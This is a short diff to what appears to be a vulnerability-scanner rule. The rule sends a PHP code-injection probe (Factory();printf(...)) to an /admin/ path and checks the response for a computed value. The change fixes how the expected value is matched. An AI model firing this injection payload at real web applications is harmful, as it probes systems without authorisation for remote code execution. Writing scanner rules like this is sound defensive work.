@@ -7,7 +7,8 @@ rules:
     path: /admin/?a=Factory();printf('{{r1}}%%{{r2}}');//../
     follow_redirects: false
     expression: |
-      status == 200 && body.bcontains(b'{{r1}}%{{r2}}')
+      status == 200 && body.bcontains(bytes(r1%r2))
+
 detail:
   author: j4ckzh0u(https://github.com/j4ckzh0u)
   links:
